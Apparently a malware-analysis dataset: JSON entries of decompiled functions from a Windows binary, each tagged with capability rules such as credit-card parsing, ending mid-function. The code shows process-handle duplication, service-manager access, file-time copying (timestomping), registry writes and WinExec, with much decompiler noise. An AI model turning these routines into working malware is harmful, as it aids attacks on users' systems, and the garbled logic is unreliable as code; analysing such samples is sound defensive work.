{
    "00401000": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00401000(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint *puVar5;\n    uint *puVar6;\n    bool bVar7;\n    \n    // [00] -r-x section size 20480 named .text\n    puVar5 = &stack0xfffffffc;\n    iVar2 = fcn.00404e30(0x4111dc);\n    if (iVar2 == -1) {\n        return 0;\n    }\n    if ((!SBORROW4(iVar2, -1)) && (SBORROW4(iVar2, -1))) {\n        LOCK();\n    }\n    uVar3 = (*_sym.imp.KERNEL32.dll_OpenProcess)();\n    bVar7 = (POPCOUNT(uVar3 & 0xff) & 1U) != 0;\n    if (uVar3 == 0) {\n        return 0;\n    }\n    if ((bVar7) && (!bVar7)) {\n        puVar6 = &stack0xffffffe0;\n        cVar1 = '\\x1e';\n        do {\n            puVar5 = puVar5 + -1;\n            puVar6 = puVar6 + -1;\n            *puVar6 = *puVar5;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n        uVar4 = in(0x78);\n        return uVar4;\n    }\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(arg_8h, uVar3, 0, 0, 0);\n    iVar2 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)(uVar4);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar3);\n    return 1;\n}\n",
        "token_count": 446
    },
    "004010e0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004011e9) overlaps instruction at (ram,0x004011e8)\n// \n// WARNING: Removing unreachable block (ram,0x0040114d)\n// WARNING: Removing unreachable block (ram,0x0040115b)\n// WARNING: Removing unreachable block (ram,0x0040115d)\n// WARNING: Removing unreachable block (ram,0x0040119a)\n// WARNING: Removing unreachable block (ram,0x0040111e)\n// WARNING: Heritage AFTER dead removal. Example location: s0x00000004 : 0x00401249\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __fastcall fcn.004010e0(uint param_1, uint8_t param_2, uint param_3, uint param_4, uint param_5)\n\n{\n    int32_t *piVar1;\n    int32_t arg_8h;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint hSCManager;\n    uint uVar4;\n    uint8_t *unaff_EBX;\n    uint32_t *unaff_EDI;\n    uint32_t *puVar5;\n    uint16_t in_DS;\n    bool bVar6;\n    uint8_t in_AF;\n    bool bVar7;\n    char cVar8;\n    char cVar9;\n    ulong uVar10;\n    int32_t iStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint uStack24;\n    uint uStack20;\n    uint32_t uStack16;\n    uchar auStack8 [4];\n    \n    cVar9 = '\\0';\n    cVar8 = (param_1 >> 8 | param_2 | 0x1f) < '\\0';\n    uStack16 = 0x4010f7;\n    uVar10 = fcn.00403fe0();\n    *0x421618 = uVar10;\n    puVar5 = unaff_EDI;\n    if (cVar9 == cVar8) {\n        uVar3 = (uVar10 >> 0x20) << 0x10;\n        uStack16 = uStack16 & 0xffff | uVar3;\n        if (cVar9 != cVar8) {\n            out(0xc4, *0x421618);\n            uStack16 = uVar3 | in_DS;\n            puVar5 = unaff_EDI + 1;\n            *unaff_EDI = *0x421618;\n        }\n    }\n    uStack20 = 0;\n    uStack24 = 0x80;\n    puStack28 = 0x2;\n    uStack32 = 0;\n    uStack36 = 1;\n    iStack40 = 0x40000000;\n    arg_8h = (*_sym.imp.KERNEL32.dll_CreateFileA)(param_3);\n    if (arg_8h != -1) {\n        uStack32 = param_5;\n        uStack36 = param_4;\n        puStack28 = &stack0xfffffff8;\n        uStack24 = 0;\n        iStack40 = arg_8h;\n        iVar2 = (*_sym.imp.KERNEL32.dll_WriteFile)();\n        if (iVar2 == 0) {\n            return 0;\n        }\n        bVar6 = false;\n        bVar7 = *0x421618 == 0;\n        if (!bVar7) {\n            iVar2 = fcn.00401000(arg_8h);\n            bVar6 = (iVar2 != 0) != 0;\n            *0x421618 = 1 - (iVar2 != 0);\n            bVar7 = *0x421618 == 0;\n        }\n        if ((!bVar7) && (bVar7)) {\n            unaff_EBX = unaff_EBX + 1;\n            if (bVar6 || unaff_EBX == NULL) {\n                hSCManager = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f, puVar5, arg_8h, unaff_EBX);\n                fcn.00402ab0(hSCManager, param_3);\n                uVar4 = fcn.00401930(hSCManager, param_3, param_4);\n                (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCManager);\n                return uVar4;\n            }\n            in_AF = 9 < (*0x421618 & 0xf) | in_AF;\n            piVar1 = (*0x421618 & 0xffff0000 | CONCAT11((*0x421618 >> 8) + in_AF, *0x421618 + in_AF * '\\x06') & 0xff0f)\n                     + 0x2a;\n            *piVar1 = *piVar1 - unaff_EBX;\n            arg_8h = arg_8h + 1;\n        }\n        uVar3 = fcn.00402440(0, arg_8h);\n        if ((&stack0xffffffd8 < 0) || (&stack0xffffffd8 >= 0)) {\n            uVar3 = *0x421618;\n        }\n        *unaff_EBX = *unaff_EBX & 0xc3;\n        if (arg_8h == 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar3 + 0xe40ce22a);\n        }\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 1226
    },
    "00401400": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401666) overlaps instruction at (ram,0x00401664)\n// \n// WARNING: Removing unreachable block (ram,0x004014e1)\n// WARNING: Removing unreachable block (ram,0x004014c6)\n// WARNING: Removing unreachable block (ram,0x004014e3)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuchar * fcn.00401400(uint param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    uint8_t *puVar1;\n    uint uVar2;\n    uchar *puVar3;\n    uint8_t extraout_CL;\n    int32_t iVar4;\n    int32_t unaff_EBX;\n    uint *puVar5;\n    uint *puVar6;\n    bool bVar7;\n    unkbyte6 Var8;\n    unkuint3 Stack556;\n    int32_t iStack557;\n    uchar uStack553;\n    uchar uStack536;\n    uint uStack535;\n    uchar uStack276;\n    uint uStack275;\n    uchar *puStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack536 = 0;\n    puVar5 = &uStack535;\n    for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    uStack276 = 0;\n    puVar5 = &uStack275;\n    for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    puStack16 = 0x1;\n    puVar6 = puVar5 + 3;\n    *(puVar5 + 2) = 0;\n    Stack556 = &uStack536;\n    uStack553 = &uStack536 >> 0x18;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    (*_sym.imp.MSVCRT.dll_sprintf)(0xec, 0x90, 0xe8);\n    fcn.00402740(&uStack8, &uStack12);\n    iVar4 = fcn.00404a10(param_1, param_2, param_3, param_4, uStack8, uStack12);\n    if (iVar4 == 0) {\n        return NULL;\n    }\n    iVar4 = fcn.004010e0(0xec, uStack8);\n    if (iVar4 == 0) {\n        return NULL;\n    }\n    fcn.00404980();\n    iVar4 = fcn.00404e30(0x4111c8);\n    if (iVar4 == -1) {\n        iVar4 = fcn.00404e30(0x4111bc);\n        if (iVar4 != -1) {\n            puVar6 = 0xf;\n            goto code_r0x00401578;\n        }\n    }\n    else {\n        puVar6 = 0xe;\ncode_r0x00401578:\n        iVar4 = fcn.00401740(param_1);\n        if (iVar4 != 0) {\n            iStack557 = Stack556 << 8;\n            fcn.004041f0();\n            fcn.00402df0(puVar6);\n            return 0x1;\n        }\n        if (*0x421618 == 0) {\n            return NULL;\n        }\n    }\n    Var8 = fcn.00401210(param_1);\n    bVar7 = Var8 != 0;\n    if ((!bVar7) || (bVar7)) {\ncode_r0x004015f7:\n        puVar1 = unaff_EBX + -0x3f7a0bbb;\n        *puVar1 = *puVar1 ^ extraout_CL;\n        if (*puVar1 != 0) {\n            fcn.00403130(param_1);\n        }\n        if (puStack16 == NULL) {\n            fcn.00403190(param_1, 0);\n        }\n        bVar7 = false;\n        puVar3 = puStack16;\n        if (puStack16 != NULL) {\n            fcn.00402df0();\n            bVar7 = SCARRY4(&stack0xfffffdcf, 4);\n            puVar3 = &stack0xfffffdd3;\n        }\n        if ((bVar7 == puVar3 < 0) && (bVar7 != puVar3 < 0)) goto code_r0x00401671;\n        Stack556 = 3;\n    }\n    else {\n        uVar2 = in(Var8 >> 0x20);\n        *puVar6 = uVar2;\n        if (0 < &Stack556) goto code_r0x004015f7;\n    }\n    (*_sym.imp.KERNEL32.dll_Sleep)();\ncode_r0x00401671:\n    (*_sym.imp.KERNEL32.dll_WinExec)(0xdc);\n    return puStack16;\n}\n",
        "token_count": 1160
    },
    "00401780": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401884) overlaps instruction at (ram,0x00401882)\n// \n// WARNING: Removing unreachable block (ram,0x004018c6)\n// WARNING: Removing unreachable block (ram,0x004018d3)\n// WARNING: Removing unreachable block (ram,0x00401884)\n// WARNING: Could not reconcile some variable overlaps\n\nbool fcn.00401780(void)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    uint8_t uVar4;\n    uint32_t uVar5;\n    char *pcVar6;\n    int32_t iVar7;\n    uint32_t extraout_ECX;\n    uint32_t uVar9;\n    uint32_t extraout_ECX_00;\n    uint *unaff_ESI;\n    int32_t unaff_EDI;\n    uint *puVar10;\n    ushort in_SS;\n    uchar uVar11;\n    uint8_t in_AF;\n    bool bVar12;\n    ulong uVar13;\n    uint var_80h;\n    uint var_60h;\n    uint var_40h;\n    uchar var_20h;\n    uint var_1fh;\n    char cVar8;\n    \n    uVar13 = fcn.00402f40();\n    bVar12 = uVar13 == 0;\n    uVar11 = (POPCOUNT(uVar13 & 0xff) & 1U) == 0;\n    if (bVar12) {\n        return false;\n    }\n    if (!bVar12) {\n        uVar9 = (extraout_ECX >> 8 & 0xffff00) << 8 | extraout_ECX & 0xffff;\n        if (bVar12) {\n            unaff_EDI = CONCAT22(extraout_ECX, in_SS);\n            uVar11 = (POPCOUNT(pe_dos_header) & 1U) == 0;\n            goto code_r0x004017c3;\n        }\n    }\n    uVar13 = fcn.00402e90();\n    uVar9 = extraout_ECX_00;\ncode_r0x004017c3:\n    pcVar6 = uVar13 >> 0x20;\n    if ((uVar11) || (!uVar11)) {\n        pcVar6 = fcn.00404e30(0x4111d4);\n    }\n    else {\n        out(*unaff_ESI, uVar13 >> 0x20);\n        uVar2 = uVar13;\n        do {\n            uVar5 = uVar2;\n            cVar8 = uVar5 >> 8;\n            in_AF = 9 < (uVar5 & 0xf) | in_AF;\n            uVar3 = -in_AF;\n            uVar2 = CONCAT31(CONCAT21(uVar5 >> 0x10, cVar8 - in_AF), uVar3);\n        } while (in_AF || cVar8 == *pcVar6);\n        piVar1 = unaff_EDI + pcVar6 * 2;\n        *piVar1 = (*piVar1 + 0x7b) - in_AF;\n        *(uVar9 + 0x68) = uVar2;\n        uVar4 = uVar3 % 0x11 + (uVar9 + 1 >> 8);\n        pcVar6 = uVar5 & 0xffff0000 | CONCAT11(uVar3 / 0x11, uVar3) & 0xffffff00 | uVar4;\n        *pcVar6 = *pcVar6 + uVar4;\n    }\n    if (pcVar6 != 0xffffffff) {\n        return false;\n    }\n    fcn.004039b0();\n    *0x42161c = 1;\n    iVar7 = fcn.00402410();\n    if (iVar7 != 0) {\n        return false;\n    }\n    var_20h = 0;\n    var_80h._0_1_ = 0;\n    puVar10 = &var_1fh;\n    for (iVar7 = 7; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    *puVar10 = 0;\n    *(puVar10 + 2) = 0;\n    var_60h._0_1_ = 0;\n    puVar10 = &var_80h + 1;\n    for (iVar7 = 7; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    *puVar10 = 0;\n    *(puVar10 + 2) = 0;\n    var_40h._0_1_ = 0;\n    puVar10 = &var_60h + 1;\n    for (iVar7 = 7; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    *puVar10 = 0;\n    *(puVar10 + 2) = 0;\n    puVar10 = &var_40h + 1;\n    for (iVar7 = 7; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    *puVar10 = 0;\n    *(puVar10 + 2) = 0;\n    iVar7 = fcn.00404430(&var_80h, &var_60h, &var_20h, &var_40h);\n    if (iVar7 != 0) {\n        iVar7 = fcn.00404600(&var_20h);\n        if (iVar7 != 0) {\n            iVar7 = fcn.00401400(&var_80h, &var_60h, *0x10 + -0x24, 0xbc);\n            return iVar7 != 0;\n        }\n        return false;\n    }\n    return false;\n}\n",
        "token_count": 1376
    },
    "00402410": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.00402410(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00404c10(0x411170);\n    if (iVar1 != -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 74
    },
    "00402440": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402440(uint arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    char *pcVar7;\n    char *pcVar8;\n    uint *puVar9;\n    char lpBuffer;\n    uint var_22fh;\n    uchar var_12ch;\n    uint var_12bh;\n    uint var_28h;\n    uint lpCreationTime;\n    uint lpLastAccessTime;\n    uint lpLastWriteTime;\n    int32_t var_4h;\n    \n    var_4h = arg_ch;\n    lpBuffer = '\\0';\n    puVar5 = &var_22fh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_12ch = '\\0';\n    puVar5 = &var_12bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    uVar3 = 0xffffffff;\n    pcVar7 = &lpBuffer;\n    do {\n        pcVar6 = pcVar7;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar6 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar6;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    puVar5 = pcVar6 + -uVar3;\n    puVar9 = &var_12ch;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    uVar3 = 0xffffffff;\n    pcVar7 = 0x4111a8;\n    do {\n        pcVar6 = pcVar7;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar6 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar6;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar7 = &var_12ch;\n    do {\n        pcVar8 = pcVar7;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar8 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar8;\n    } while (cVar1 != '\\0');\n    puVar5 = pcVar6 + -uVar3;\n    puVar9 = pcVar8 + -1;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)(&var_12ch, 0, &var_28h);\n    iVar2 = var_4h;\n    if ((arg_ch == -1) && (iVar2 = fcn.00404c10(arg_8h),  iVar2 == -1)) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_SetFileTime)(iVar2, &lpCreationTime, &lpLastAccessTime, &lpLastWriteTime);\n    if (arg_ch == -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n    }\n    return 1;\n}\n",
        "token_count": 1150
    },
    "00402900": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004029a4) overlaps instruction at (ram,0x0040299f)\n// \n\nvoid fcn.00402900(uint param_1, uint param_2, uint param_3, uint param_4, int32_t param_5, uint8_t *param_6, \n                 int32_t param_7)\n\n{\n    uint8_t *puVar1;\n    uint arg_ch;\n    uint8_t in_AL;\n    char *arg_10h;\n    uint8_t extraout_CL;\n    uint8_t extraout_CH;\n    uint8_t extraout_DL;\n    char *arg_18h;\n    int32_t unaff_EBX;\n    int32_t iVar2;\n    int32_t unaff_ESI;\n    char *pcVar3;\n    uint8_t *unaff_EDI;\n    uint *puVar4;\n    uint8_t in_AF;\n    bool bVar5;\n    char cVar6;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    char cVar7;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint32_t uVar8;\n    ulong uVar9;\n    uint8_t *in_stack_fffffed4;\n    uint in_stack_fffffed8;\n    uint in_stack_fffffedc;\n    \n    if ((&stack0xfffffffc < 0x10c) || (&stack0xfffffffc >= 0x10c)) {\n        in_AL = param_7 + 0x20;\n        in_stack_fffffedc = 0x20;\n        unaff_EBX = param_5;\n        unaff_ESI = param_7;\n        unaff_EDI = param_6;\n        in_stack_fffffed4 = param_6;\n        in_stack_fffffed8 = param_1;\n    }\n    cVar6 = in_AL - *unaff_EDI;\n    uVar8 = (in_NT & 1) * 0x4000 | SBORROW1(in_AL, *unaff_EDI) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 |\n            (cVar6 < '\\0') * 0x80 | (cVar6 == '\\0') * 0x40 | (in_AF & 1) * 0x10 | ((POPCOUNT(cVar6) & 1U) == 0) * 4 |\n            in_AL < *unaff_EDI | (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 |\n            (in_AC & 1) * 0x40000;\n    func_0x10188896();\n    *(unaff_EBX + 0x5d8b1c7d) = *(unaff_EBX + 0x5d8b1c7d) | unaff_EBX + 0x75U;\n    *(unaff_EBX + 0x4d8b20cc) = *(unaff_EBX + 0x4d8b20cc) & extraout_DL;\n    fcn.00402fb0(unaff_EBX, uVar8, in_stack_fffffed4, in_stack_fffffed8, in_stack_fffffedc);\n    fcn.00402fb0(unaff_EBX, unaff_EDI + 1, param_2, 0x20, unaff_ESI + 0x5f);\n    cVar7 = '\\0';\n    cVar6 = (extraout_CH | 0x47) < '\\0';\n    bVar5 = (extraout_CH | 0x47) == 0;\n    uVar8 = &stack0xfffffffc & 0xffff0000 | *0x10 - 4;\n    pcVar3 = *(uVar8 + 0x20);\n    arg_ch = *(uVar8 + 0x1c);\n    iVar2 = *(uVar8 + 0x18);\n    uVar9 = fcn.00402fb0(iVar2, arg_ch, *(uVar8 + 0x10), 0x20, pcVar3 + 0xa0);\n    arg_18h = uVar9 >> 0x20;\n    if ((bVar5 || cVar7 != cVar6) || (!bVar5 && cVar7 == cVar6)) {\n        arg_10h = *(uVar8 + 0x14);\n        arg_18h = pcVar3 + 0xe0;\n    }\n    else {\n        iVar2 = iVar2 + 1;\n        puVar1 = uVar9 + 0x8b39da56;\n        *puVar1 = *puVar1 ^ extraout_CL;\n        uVar8 = uVar8 + 1;\n        *pcVar3 = *pcVar3 + pcVar3;\n        arg_10h = pcVar3;\n        pcVar3 = uVar9 & 0xffffff00 | uVar9 + 0x8d;\n    }\n    fcn.00402fb0(iVar2, arg_ch, arg_10h, 0x20, arg_18h);\n    iVar2 = fcn.004028b0();\n    if (iVar2 == -1) {\n        iVar2 = (*_sym.imp.MSVCRT.dll_rand)();\n        pcVar3[0x120] = iVar2 % 5;\n    }\n    else {\n        pcVar3[0x120] = iVar2;\n    }\n    *(uVar8 - 0x10c) = 0;\n    puVar4 = uVar8 - 0x10b;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    *(uVar8 - 4) = 0x104;\n    *(puVar4 + 2) = 0;\n    iVar2 = fcn.00402e00(0x80000001, 0x4113b8, 0x4113e4, uVar8 - 8, uVar8 - 0x10c, uVar8 - 4);\n    if ((iVar2 != 0) && (iVar2 = (*_sym.imp.MSVCRT.dll__stricmp)(),  iVar2 == 0)) {\n        pcVar3[0x120] = pcVar3[0x120] | 0x80;\n    }\n    return;\n}\n",
        "token_count": 1504
    },
    "00403fe0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404005) overlaps instruction at (ram,0x00404003)\n// \n\nbool fcn.00403fe0(void)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    uint var_10ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0x104;\n    if ((&var_10ch < 0) || (&var_10ch >= 0)) {\n        in_EAX = &var_4h;\n    }\n    iVar1 = fcn.00402e00(0x80000002, 0x411450, 0x411490, &var_8h, &var_10ch, \n                         in_EAX + (&stack0xfffffffc < 0x10c) + 0xfc458d2f);\n    if (iVar1 == 0) {\n        return false;\n    }\n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(&var_10ch, 0);\n    return iVar1 != -1;\n}\n",
        "token_count": 242
    },
    "00404930": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404971) overlaps instruction at (ram,0x00404970)\n// \n\nbool __cdecl fcn.00404930(uint arg_8h)\n\n{\n    uint uVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    uint32_t extraout_ECX;\n    uint8_t *unaff_EBX;\n    uint *unaff_EDI;\n    bool bVar4;\n    ulong uVar5;\n    \n    uVar5 = (*_sym.imp.MSVCRT.dll__access)();\n    bVar4 = uVar5 == -1;\n    if (bVar4) {\n        return true;\n    }\n    if ((!bVar4) && (bVar4)) {\n        uVar1 = in(uVar5 >> 0x20);\n        *unaff_EDI = uVar1;\n        if (0 < &stack0xfffffff8) {\n            *unaff_EBX = *unaff_EBX ^ uVar5 >> 0x28;\n            uVar2 = unaff_EBX[0x5d];\n            unaff_EBX[0x5d] = uVar2 >> 3 | uVar2 << 6;\n            return true;\n        }\n        *(unaff_EBX + -0xd3fcc06) = *(unaff_EBX + -0xd3fcc06) + -1;\n        iVar3 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x411338, 0x411378, 1, uVar5 >> 0x20, ~extraout_ECX - 1)\n        ;\n        return iVar3 == 0;\n    }\n    return false;\n}\n",
        "token_count": 376
    },
    "00404e30": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00404e30(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_10ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0xffffffff;\n    var_4h = (**0x42163c)();\n    if (var_4h != -1) {\n        puVar2 = &var_12ch;\n        for (iVar1 = 0x49; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar2 = 0;\n            puVar2 = puVar2 + 1;\n        }\n        iVar1 = (**0x421640)();\n        while ((iVar1 != 0 && (iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(),  iVar1 != 0))) {\n            iVar1 = (**0x421644)();\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)();\n        return var_8h;\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 273
    },
    "00401370": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302",
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004013cd) overlaps instruction at (ram,0x004013cc)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00401370(uint filename, uint mode, uint ptr, uint nitems)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    uint8_t *unaff_EDI;\n    bool bVar4;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    \n    iVar3 = (*_sym.imp.MSVCRT.dll_fopen)(filename, mode);\n    if (iVar3 == 0) {\n        return 0;\n    }\n    bVar4 = false;\n    uVar2 = (*_sym.imp.MSVCRT.dll_fwrite)(ptr, 1, nitems, iVar3);\n    if (!bVar4) {\n        if (bVar4) {\n            cVar1 = uVar2 - *unaff_EDI;\n            iVar3 = iVar3 + -1;\n            func_0x1018733f((in_NT & 1) * 0x4000 | SBORROW1(uVar2, *unaff_EDI) * 0x800 | (in_IF & 1) * 0x200 |\n                            (in_TF & 1) * 0x100 | (cVar1 < '\\0') * 0x80 | (cVar1 == '\\0') * 0x40 | (in_AF & 1) * 0x10 |\n                            ((POPCOUNT(cVar1) & 1U) == 0) * 4 | uVar2 < *unaff_EDI | (in_ID & 1) * 0x200000 |\n                            (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000);\n            goto code_r0x004013d4;\n        }\n    }\n    (*_sym.imp.MSVCRT.dll_fflush)(iVar3);\ncode_r0x004013d4:\n    (*_sym.imp.MSVCRT.dll_fclose)(iVar3);\n    return 1;\n}\n",
        "token_count": 542
    },
    "00402200": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004023c8) overlaps instruction at (ram,0x004023c6)\n// \n// WARNING: Removing unreachable block (ram,0x0040230c)\n// WARNING: Removing unreachable block (ram,0x00402387)\n\nvoid __fastcall fcn.00402200(ushort param_1, ushort param_2)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t extraout_ECX;\n    uint extraout_EDX;\n    uint *puVar4;\n    bool bVar5;\n    unkbyte6 Var6;\n    uint uStack640;\n    uchar *puStack636;\n    uint uStack632;\n    uchar var_260h;\n    uint var_25fh;\n    uchar var_15ch;\n    uint var_15bh;\n    uint var_58h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uStack632 = CONCAT22(param_1, param_2);\n    fcn.00403d30();\n    puStack636 = extraout_EDX;\n    iVar3 = fcn.004019e0();\n    if (iVar3 != 0) {\n        var_260h = 0;\n        puVar4 = &var_25fh;\n        for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar4 = 0;\n            puVar4 = puVar4 + 1;\n        }\n        *puVar4 = 0;\n        *(puVar4 + 2) = 0;\n        puStack636 = &var_260h;\n        uStack632 = 0x26;\n        uStack640 = 0;\n        iVar3 